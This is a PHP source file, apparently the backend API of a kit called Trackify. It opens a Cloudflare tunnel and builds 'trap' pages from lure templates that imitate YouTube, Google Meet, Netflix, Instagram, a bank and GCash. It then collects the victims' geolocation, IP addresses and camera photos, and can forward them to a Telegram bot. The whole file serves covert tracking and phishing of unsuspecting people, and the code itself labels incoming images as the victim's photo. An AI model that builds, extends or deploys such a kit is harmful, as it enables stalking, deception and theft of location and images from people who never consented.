<?php
/**
 * Trackify Dashboard API
 * Handles link generation, captures, and status
 */

declare(strict_types=1);

$action = $_GET['action'] ?? '';
$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'status', 'terminal', 'telegram', 'update_payload', 'diag'];

if (in_array($action, $authActions, true)) {
    require_once __DIR__ . '/bootstrap.php';
    if (empty($_SESSION['user_id'])) {
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        echo json_encode(['status' => 'error', 'message' => 'Authentication required']);
        exit;
    }
}

header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

$_root = realpath(__DIR__);
$baseDir = $_root !== false ? $_root : __DIR__;
chdir($baseDir);

require_once $baseDir . '/trackify_capture.php';

switch ($action) {
    case 'start':
        handleStart();
        break;
    case 'stop':
        handleStop();
        break;
    case 'link':
        handleLink();
        break;
    case 'captures':
        handleCaptures();
        break;
    case 'photos':
        handlePhotos();
        break;
    case 'status':
        handleStatus();
        break;
    case 'terminal':
        handleTerminal();
        break;
    case 'telegram':
        handleTelegram();
        break;
    case 'update_payload':
        handleUpdatePayload();
        break;
    case 'diag':
        handleDiag();
        break;
    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}

function dashboard_session_user_id(): int
{
    return (int) ($_SESSION['user_id'] ?? 0);
}

function read_dashboard_config(string $baseDir): array
{
    $defaults = [
        'template' => '2',
        'yt_video_id' => 'dQw4w9WgXcQ',
        'tracker_token' => '',
        'user_id' => 0,
    ];
    $path = $baseDir . '/dashboard_config.json';
    if (!file_exists($path)) {
        return $defaults;
    }
    $merged = array_merge($defaults, json_decode(file_get_contents($path), true) ?: []);
    return $merged;
}

function config_owned_by_session(array $config): bool
{
    return !empty($config['user_id'])
        && (int) $config['user_id'] === dashboard_session_user_id();
}

function normalize_template_id($value): int
{
    $t = (int) $value;
    if ($t < 1 || $t > 7) {
        return 2;
    }
    return $t;
}

/**
 * URL cloudflared forwards to. Default assumes `php -S 127.0.0.1:8000` from project root.
 * Laragon / Apache: set tunnel_origin in config.php (project root), e.g. http://trackify.test
 */
function tunnel_origin_url(): string
{
    $path = __DIR__ . '/config.php';
    if (!is_readable($path)) {
        return 'http://127.0.0.1:8000';
    }
    $cfg = require $path;
    $raw = $cfg['tunnel_origin'] ?? '';
    if (is_string($raw)) {
        $u = trim($raw);
        if ($u !== '' && preg_match('#^https?://#i', $u)) {
            return $u;
        }
    }
    return 'http://127.0.0.1:8000';
}

/** @return non-empty-string|null */
function resolve_cloudflared_binary(string $baseDir, bool $isWin): ?string
{
    $name = $isWin ? 'cloudflared.exe' : 'cloudflared';
    $local = $baseDir . DIRECTORY_SEPARATOR . $name;
    if (is_file($local)) {
        $rp = realpath($local);

        return ($rp !== false && $rp !== '') ? $rp : $local;
    }
    if ($isWin) {
        $out = [];
        @exec('where cloudflared 2>nul', $out);
        if (!empty($out[0])) {
            $p = trim($out[0]);

            return is_file($p) ? $p : null;
        }
    } else {
        $p = trim((string) shell_exec('command -v cloudflared 2>/dev/null'));
        if ($p !== '' && is_file($p)) {
            return $p;
        }
    }

    return null;
}

function reconcile_dashboard_config_for_session(string $baseDir, array $config): array
{
    if (config_owned_by_session($config)) {
        return $config;
    }
    $sessionUid = dashboard_session_user_id();
    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        return $config;
    }
    $owner = trackify_user_id_for_token($token);
    if ($owner !== null && $owner === $sessionUid) {
        $config['user_id'] = $sessionUid;
        $path = $baseDir . '/dashboard_config.json';
        @file_put_contents($path, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX);
    }
    return $config;
}

function handleStart(): void
{
    global $baseDir;

    $userId = dashboard_session_user_id();
    $token = trackify_issue_tracker_token($userId);
    if ($token === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Could not create tracker token. Run schema.sql (tracker_tokens) and check MySQL.',
        ]);
        return;
    }

    $template = normalize_template_id($_POST['template'] ?? 2);
    $ytVideoId = $_POST['yt_video_id'] ?? 'dQw4w9WgXcQ';
    $telegram = isset($_POST['telegram']) ? (bool) $_POST['telegram'] : false;
    $botToken = $_POST['bot_token'] ?? '';
    $chatId = $_POST['chat_id'] ?? '';

    $cfgPath = $baseDir . '/dashboard_config.json';
    $cfgPayload = json_encode([
        'template' => $template,
        'yt_video_id' => (string) $ytVideoId,
        'tracker_token' => $token,
        'user_id' => $userId,
    ], JSON_PRETTY_PRINT);
    if (@file_put_contents($cfgPath, $cfgPayload, LOCK_EX) === false) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Cannot write dashboard_config.json. Fix permissions on the project root (web user must be able to write this file).',
        ]);
        return;
    }

    if ($telegram && (!empty($botToken) || !empty($chatId))) {
        $config = [
            'bot_token' => $botToken,
            'chat_id' => $chatId,
        ];
        file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));
    }

    $sendlink = $baseDir . '/sendlink';
    @unlink($sendlink);

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $binary = resolve_cloudflared_binary($baseDir, $isWin);
    if ($binary === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'cloudflared is not installed or not in PATH. Place cloudflared' . ($isWin ? '.exe' : '') . ' in the project folder, or install from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/',
        ]);

        return;
    }

    $origin = tunnel_origin_url();
    $cmd = escapeshellarg($binary) . ' tunnel --url ' . escapeshellarg($origin);

    if ($isWin) {
        $winBase = str_replace('/', '\\', $baseDir);
        $cd = strpos($winBase, ' ') !== false
            ? 'cd /d "' . str_replace('"', '""', $winBase) . '"'
            : 'cd /d ' . $winBase;
        $fullCmd = 'start /B cmd /c "' . $cd . ' && ' . $cmd . ' > sendlink 2>&1"';
        pclose(popen($fullCmd, 'r'));
    } else {
        if (!function_exists('exec')) {
            echo json_encode([
                'status' => 'error',
                'message' => 'PHP exec() is disabled; cannot start cloudflared. Enable exec in php.ini or run the tunnel manually.',
            ]);

            return;
        }
        exec('cd ' . escapeshellarg($baseDir) . ' && nohup ' . $cmd . ' > sendlink 2>&1 &');
    }

    echo json_encode([
        'status' => 'starting',
        'message' => 'Tunnel starting... Poll /api.php?action=link for the URL',
    ]);
}

function handleStop(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Tunnel was started by another account or is not active for you.',
        ]);
        return;
    }

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $stopped = [];

    if ($isWin) {
        @exec('taskkill /F /IM cloudflared.exe 2>nul', $out, $code);
        if ($code === 0) {
            $stopped[] = 'cloudflared';
        }
        @exec('taskkill /F /IM ngrok.exe 2>nul', $out, $code);
        if ($code === 0) {
            $stopped[] = 'ngrok';
        }
    } else {
        @exec('pkill -f cloudflared 2>/dev/null', $out, $code);
        if ($code === 0) {
            $stopped[] = 'cloudflared';
        }
        @exec('pkill -f ngrok 2>/dev/null', $out, $code);
        if ($code === 0) {
            $stopped[] = 'ngrok';
        }
        @exec('killall cloudflared 2>/dev/null', $out, $code);
        @exec('killall ngrok 2>/dev/null', $out, $code);
    }

    $sendlink = $baseDir . '/sendlink';
    if (file_exists($sendlink)) {
        @unlink($sendlink);
    }

    echo json_encode([
        'status' => 'success',
        'message' => 'Tunnel stopped',
        'stopped' => $stopped,
    ]);
}

function extract_trycloudflare_url(string $sendlinkFile): ?string
{
    if (!file_exists($sendlinkFile) || filesize($sendlinkFile) === 0) {
        return null;
    }
    $content = (string) file_get_contents($sendlinkFile);
    // cloudflared may write ANSI escapes even when redirected
    $plain = preg_replace('/\x1b\[[0-9;]*[A-Za-z]|\x1b\]8;[^\x07]*\x07|\x1b\][0-9;]*\x07/', '', $content) ?? $content;
    // Quick tunnel hostnames: word chars and hyphens; allow nested labels if CF changes format
    if (preg_match('#https://[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.trycloudflare\.com#i', $plain, $m)) {
        return rtrim($m[0], '.,);]\'"');
    }
    if (preg_match('#https://[^\s<>"\']+\.trycloudflare\.com#i', $plain, $m)) {
        return rtrim($m[0], '.,);]\'"');
    }

    return null;
}

/** Short safe snippet from sendlink for UI when tunnel URL is missing */
function tunnel_sendlink_excerpt(string $sendlinkFile, int $maxLen = 320): ?string
{
    if (!file_exists($sendlinkFile) || filesize($sendlinkFile) === 0) {
        return null;
    }
    $raw = (string) file_get_contents($sendlinkFile);
    $raw = preg_replace('/\x1b\[[0-9;]*[A-Za-z]/', '', $raw) ?? $raw;
    $one = preg_replace('/\s+/', ' ', trim($raw));

    return $one === '' ? null : substr($one, 0, $maxLen);
}

function handleLink(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode([
            'status' => 'forbidden',
            'link' => null,
            'message' => 'No active tunnel run for your account. Click Generate Link again. If this persists, ensure dashboard_config.json is writable and MySQL has the tracker_tokens table (see schema.sql).',
        ]);
        return;
    }

    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        echo json_encode(['status' => 'error', 'link' => null, 'message' => 'Missing tracker token; generate again.']);
        return;
    }

    $sendlink = $baseDir . '/sendlink';
    $link = extract_trycloudflare_url($sendlink);

    $payloadOk = true;
    $builtTemplate = null;
    $payloadStamp = null;
    $trapFile = null;
    if ($link !== null) {
        $tpl = normalize_template_id($config['template'] ?? 2);
        $yt = (string) ($config['yt_video_id'] ?? 'dQw4w9WgXcQ');
        $gen = generatePayload($link, $tpl, $yt, $token);
        $payloadOk = $gen['ok'];
        $builtTemplate = $gen['template_id'];
        $payloadStamp = $gen['stamp'];
        $trapFile = $gen['trap_file'] ?? null;
    }

    $excerpt = ($link === null) ? tunnel_sendlink_excerpt($sendlink) : null;

    echo json_encode([
        'status' => $link ? 'ready' : 'starting',
        'link' => $link,
        'payload_ok' => $payloadOk,
        'template_id' => $builtTemplate,
        'payload_stamp' => $payloadStamp,
        'trap_file' => $trapFile,
        'tunnel_log_excerpt' => $excerpt,
    ]);
}

function handleUpdatePayload(): void
{
    global $baseDir;

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode(['status' => 'error', 'message' => 'No active session config for your account. Generate a link first.']);
        return;
    }

    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        echo json_encode(['status' => 'error', 'message' => 'Missing tracker token; generate again.']);
        return;
    }

    $tpl = normalize_template_id($_POST['template'] ?? $config['template'] ?? 2);
    $yt = (string) ($_POST['yt_video_id'] ?? $config['yt_video_id'] ?? 'dQw4w9WgXcQ');

    $config['template'] = $tpl;
    $config['yt_video_id'] = $yt;

    $cfgPath = $baseDir . '/dashboard_config.json';
    if (@file_put_contents($cfgPath, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX) === false) {
        echo json_encode(['status' => 'error', 'message' => 'Cannot save dashboard_config.json']);
        return;
    }

    $sendlink = $baseDir . '/sendlink';
    $link = extract_trycloudflare_url($sendlink);
    $payloadOk = true;
    $genStamp = null;
    $trapFile = null;
    if ($link !== null) {
        $gen = generatePayload($link, $tpl, $yt, $token);
        $payloadOk = $gen['ok'];
        $genStamp = $gen['stamp'];
        $trapFile = $gen['trap_file'] ?? null;
    }

    echo json_encode([
        'status' => 'success',
        'template' => $tpl,
        'regenerated' => $link !== null,
        'payload_ok' => $payloadOk,
        'payload_stamp' => $genStamp,
        'trap_file' => $trapFile,
    ]);
}

/**
 * @return array{ok: bool, template_id: int, stamp: string, trap_file: string}
 */
function generatePayload(string $link, $template, $ytVideoId, string $trackerToken): array
{
    global $baseDir;

    $template = normalize_template_id($template);
    $templates = [
        1 => 'Youtube.html',
        2 => 'Gmeet.html',
        3 => 'Sensitive.html',
        4 => 'Netflix.html',
        5 => 'Instagram.html',
        6 => 'Bank.html',
        7 => 'GCash.html',
    ];

    $templateFile = $templates[$template];
    $templatePath = $baseDir . '/' . $templateFile;

    $stamp = bin2hex(random_bytes(6)) . '-' . $template . '-' . (string) time();

    if (!is_readable($templatePath)) {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $htmlContent = file_get_contents($templatePath);
    if ($htmlContent === false || $htmlContent === '') {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $templatePhpPath = $baseDir . '/template.php';
    $templateContent = file_get_contents($templatePhpPath);
    if ($templateContent === false || $templateContent === '') {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $tplId = (string) $template;
    $indexPhp = str_replace(
        ['forwarding_link', '__TRACKIFY_TID__', '__TRACKIFY_PF__', '__TPLID__'],
        [$link, $trackerToken, rawurlencode($stamp), $tplId],
        $templateContent
    );
    if (@file_put_contents($baseDir . '/index.php', $indexPhp, LOCK_EX) === false) {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $htmlContent = str_replace(['forwarding_link', '__TRACKIFY_TID__'], [$link, $trackerToken], $htmlContent);

    // Root-relative API URLs (trap page must POST to /post.php etc., not a subpath).
    $baseUrlLine = "var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');";
    $htmlContent = str_replace($baseUrlLine, "var BASE_URL = window.location.origin + '/';", $htmlContent);

    if ($template === 1) {
        $htmlContent = str_replace('live_yt_tv', (string) $ytVideoId, $htmlContent);
    }

    $metaNoCache = '<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">' . "\n"
        . '<meta http-equiv="Pragma" content="no-cache">' . "\n";

    if (preg_match('/<head\b[^>]*>/i', $htmlContent)) {
        $htmlContent = preg_replace('/<head\b[^>]*>/i', '$0' . $metaNoCache, $htmlContent, 1);
    }

    if (preg_match('/<body\b/i', $htmlContent)) {
        $inject = '<script>window.TRACKIFY_TID=' . json_encode($trackerToken, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';
        $htmlContent = preg_replace('/<body\b[^>]*>/i', '$0' . $inject, $htmlContent, 1);
    }

    // One file per template so the URL path changes when the user picks a different template (no shared index2.html cache).
    $trapPath = $baseDir . '/trap-' . $tplId . '.html';
    $written = @file_put_contents($trapPath, $htmlContent, LOCK_EX) !== false;

    return ['ok' => $written, 'template_id' => $template, 'stamp' => $stamp, 'trap_file' => 'trap-' . $tplId . '.html'];
}

function handleDiag(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    $traps = [];
    for ($i = 1; $i <= 7; $i++) {
        $f = $baseDir . '/trap-' . $i . '.html';
        $traps['trap-' . $i . '.html'] = file_exists($f) ? filesize($f) : -1;
    }
    $idx = $baseDir . '/index.php';
    $indexHead = '';
    if (is_readable($idx)) {
        $indexHead = substr(preg_replace('/\s+/', ' ', (string) file_get_contents($idx)), 0, 280);
    }

    echo json_encode([
        'status' => 'success',
        'base_dir' => $baseDir,
        'dir_writable' => is_writable($baseDir),
        'config_template' => $config['template'] ?? null,
        'config_owned' => config_owned_by_session($config),
        'trap_files' => $traps,
        'index_php_snippet' => $indexHead,
    ]);
}

function handleCaptures(): void
{
    $uid = dashboard_session_user_id();
    $captureDir = trackify_user_capture_dir($uid);
    $relPrefix = 'data/captures/u' . $uid;

    $data = ['geolocations' => [], 'ips' => [], 'photos' => []];

    $geoFile = $captureDir . '/geolocations.json';
    if (file_exists($geoFile)) {
        $geo = json_decode(file_get_contents($geoFile), true);
        $data['geolocations'] = is_array($geo) ? array_slice($geo, -50) : [];
    }

    $ipFile = $captureDir . '/saved.ip.txt';
    if (file_exists($ipFile)) {
        $content = file_get_contents($ipFile);
        $entries = [];
        $lines = explode("\n", $content);
        $current = [];
        foreach ($lines as $line) {
            if (preg_match('/IP:\s*(.+)/', $line, $m)) {
                $current['ip'] = trim($m[1]);
            } elseif (preg_match('/IP Address:\s*(.+)/', $line, $m)) {
                $current['ip'] = trim($m[1]);
            }
            if (preg_match('/Time:\s*(.+)/', $line, $m)) {
                $current['time'] = trim($m[1]);
            } elseif (preg_match('/⏰\s*Time:\s*(.+)/u', $line, $m)) {
                $current['time'] = trim($m[1]);
            }
            if (!empty($current['ip']) && !empty($current['time'])) {
                $entries[] = $current;
                $current = [];
            }
        }
        $data['ips'] = array_slice($entries, -20);
    }

    $folders = glob($captureDir . '/20*', GLOB_ONLYDIR) ?: [];
    foreach (array_reverse($folders) as $folder) {
        $imgs = glob($folder . '/*.png') ?: [];
        foreach (array_slice($imgs, -5) as $img) {
            $data['photos'][] = [
                'path' => $relPrefix . '/' . basename(dirname($img)) . '/' . basename($img),
                'user_id' => $uid,
            ];
        }
    }

    echo json_encode([
        'status' => 'success',
        'user_id' => $uid,
        'data' => $data,
    ]);
}

function handlePhotos(): void
{
    $uid = dashboard_session_user_id();
    $captureDir = trackify_user_capture_dir($uid);
    $relPrefix = 'data/captures/u' . $uid;

    $page = max(1, (int) ($_GET['page'] ?? 1));
    $perPage = min(24, max(8, (int) ($_GET['per_page'] ?? 12)));

    $allPhotos = [];
    $folders = glob($captureDir . '/20*', GLOB_ONLYDIR) ?: [];
    foreach (array_reverse($folders) as $folder) {
        $imgs = glob($folder . '/*.png') ?: [];
        foreach ($imgs as $img) {
            $filename = basename($img);
            $folderName = basename($folder);
            $allPhotos[] = [
                'path' => $relPrefix . '/' . $folderName . '/' . $filename,
                'date' => filemtime($img),
                'filename' => $filename,
                'user_id' => $uid,
            ];
        }
    }

    usort($allPhotos, function ($a, $b) {
        return $b['date'] - $a['date'];
    });

    $total = count($allPhotos);
    $totalPages = $total ? (int) ceil($total / $perPage) : 1;
    $offset = ($page - 1) * $perPage;
    $photos = array_slice($allPhotos, $offset, $perPage);

    echo json_encode([
        'status' => 'success',
        'user_id' => $uid,
        'photos' => $photos,
        'pagination' => [
            'page' => $page,
            'per_page' => $perPage,
            'total' => $total,
            'total_pages' => $totalPages,
            'has_prev' => $page > 1,
            'has_next' => $page < $totalPages,
        ],
    ]);
}

function handleStatus(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    $sendlink = $baseDir . '/sendlink';
    $hasLink = file_exists($sendlink) && filesize($sendlink) > 0;
    $link = null;
    if ($hasLink && config_owned_by_session($config)) {
        $link = extract_trycloudflare_url($sendlink);
    }

    $telegramConfig = $baseDir . '/telegram_config.json';
    $telegramEnabled = file_exists($telegramConfig);

    echo json_encode([
        'status' => 'success',
        'tunnel_active' => (bool) $link,
        'link' => $link,
        'telegram_configured' => $telegramEnabled,
    ]);
}

function handleTerminal(): void
{
    $uid = dashboard_session_user_id();
    $dir = trackify_user_capture_dir($uid);

    $events = [];

    $loc = $dir . '/location_notify.txt';
    if (file_exists($loc)) {
        $content = file_get_contents($loc);
        $events[] = ['type' => 'location', 'content' => $content];
        @unlink($loc);
    }

    $ipPending = $dir . '/ip_pending.txt';
    if (file_exists($ipPending)) {
        $content = file_get_contents($ipPending);
        $events[] = ['type' => 'ip', 'content' => $content];
        @file_put_contents($dir . '/saved.ip.txt', $content . "\n", FILE_APPEND | LOCK_EX);
        @unlink($ipPending);
    }

    $photoFlag = $dir . '/photo_pending.flag';
    if (file_exists($photoFlag)) {
        $events[] = ['type' => 'photo', 'content' => 'Victim\'s Photo Received!'];
        @unlink($photoFlag);
    }

    echo json_encode(['status' => 'success', 'events' => $events]);
}

function handleTelegram(): void
{
    global $baseDir;

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
    $botToken = $input['bot_token'] ?? '';
    $chatId = $input['chat_id'] ?? '';

    if (empty($botToken) || empty($chatId)) {
        echo json_encode(['status' => 'error', 'message' => 'bot_token and chat_id required']);
        return;
    }

    $config = ['bot_token' => $botToken, 'chat_id' => $chatId];
    file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));

    echo json_encode(['status' => 'success', 'message' => 'Telegram config saved']);
}
